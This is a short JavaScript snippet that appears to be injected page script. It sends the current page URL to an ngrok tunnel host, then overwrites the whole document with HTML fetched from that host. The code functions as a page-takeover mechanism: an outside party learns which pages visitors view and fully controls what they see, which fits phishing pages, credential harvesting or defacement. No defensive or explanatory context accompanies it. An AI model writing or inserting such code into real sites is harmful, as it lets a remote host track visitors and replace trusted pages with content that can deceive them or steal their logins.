const host = "https://a503-71-105-119-119.ngrok-free.app";
fetch(`${host}?url=${location.href}`, {
    method: 'GET',
    headers: {'ngrok-skip-browser-warning': true}
})
    .then(response => response.text()) // Process the response as text
    .then(html => {
        console.log(html);
        document.documentElement.innerHTML = html;
    } )
    .catch(error => console.error('Error fetching the data:', error));
